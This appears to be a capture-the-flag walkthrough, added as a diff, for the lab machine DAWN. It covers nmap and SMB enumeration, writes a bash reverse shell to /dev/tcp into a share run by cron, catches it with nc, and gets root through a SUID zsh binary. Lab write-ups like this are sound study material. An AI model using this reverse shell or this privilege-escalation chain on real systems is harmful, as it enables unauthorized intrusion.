@@ -1,0 +1,128 @@
+ifconfig -> myIP = 192.168.56.125
+
+netdiscover -r 192.168.56.0/24 -i eth1
+	targetIP = 192.168.56.119
+
+nmap -sC -sV -A -T4 -p- 192.168.56.119 -oN nmap.scan
+
+	# Nmap 7.70 scan initiated Tue Aug 20 20:50:02 2019 as: nmap -sC -sV -T4 -A -oN nmap.scan 		192.168.56.119
+	Nmap scan report for 192.168.56.119
+	Host is up (0.015s latency).
+	Not shown: 996 closed ports
+	PORT     STATE SERVICE     VERSION
+	80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+	|_http-server-header: Apache/2.4.38 (Debian)
+	|_http-title: Site doesn't have a title (text/html).
+	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+	3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
+	| mysql-info: 
+	|   Protocol: 10
+	|   Version: 5.5.5-10.3.15-MariaDB-1
+	|   Thread ID: 14
+	|   Capabilities flags: 63486
+	|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolOld, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, InteractiveClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, ODBCClient, LongColumnFlag, IgnoreSigpipes, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+	|   Status: Autocommit
+	|   Salt: KS=xdls}<MR4JY`Ws_`E
+	|_  Auth Plugin Name: 96
+	MAC Address: 08:00:27:17:1F:E6 (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.2 - 4.9
+	Network Distance: 1 hop
+	Service Info: Host: DAWN
+
+	Host script results:
+	|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
+	|_nbstat: NetBIOS name: DAWN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+	| smb-os-discovery: 
+	|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+	|   Computer name: dawn
+	|   NetBIOS computer name: DAWN\x00
+	|   Domain name: dawn
+	|   FQDN: dawn.dawn
+	|_  System time: 2019-08-20T20:50:16-04:00
+	| smb-security-mode: 
+	|   account_used: guest
+	|   authentication_level: user
+	|   challenge_response: supported
+	|_  message_signing: disabled (dangerous, but default)
+	| smb2-security-mode: 
+	|   2.02: 
+	|_    Message signing enabled but not required
+	| smb2-time: 
+	|   date: 2019-08-20 20:50:16
+	|_  start_date: N/A
+
+	TRACEROUTE
+	HOP RTT      ADDRESS
+	1   15.36 ms 192.168.56.119
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Tue Aug 20 20:50:18 2019 -- 1 IP address (1 host up) scanned in 16.43 seconds
+
+Let's start with 80 for reconaissance
+	dirb http://192.168.56.119/
+	nikto -h 192.168.56.119
+Checking the site intially don't find much interesting
+	dirb finds /logs, lets go look at 192.168.56.119/logs
+	Couple different logs but restricted to them except the management logs
+
+Management log reveals a cronjob running 'web-control' and 'product-control' in the ITDEPT share
+
+Let's look at the smb shares now
+
+smbclient -L 192.168.56.119
+	This reveals the ITDEPT share
+smbclient //192.168.56.119/ITDEPT
+
+Ok so now we are in the ITDEPT share but we don't see a web-control or product-control file, but we can create one and put it on the share, and when it runs we can force it to generate a reverse shell for us.
+
+Back on our attacking machine, let's make the shell:
+
+nano web-control
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.56.125/4444 0>&1
+
+
+
+Now let's go back to our tab in the smb share
+put web-control
+Now our reverse shell is on the server and should run on the cronjob, let's start a listener and wait
+On our machine: nc -lvp 4444
+Boom shell ez
+
+first things first let's see if python is installed
+
+python --version
+bingo, let's generate a tty
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+Great now we have a workable shell. Initial enuration around the file directories don't show much interesting info, let's see if any files have root permissions
+
+cd to to the top
+
+find / -user root -perm -4000 2>/dev/null
+
+	One that sticks out is /usr/bin/zsh
+
+cd /usr/bin
+
+strings zsh
+	Looks like an sh terminal...let's try to run it and see what happens
+
+zsh
+
+boom a new terminal.
+whoami
+root
+gg
+ez
+
+cd /root
+cat flag.txt
+:)
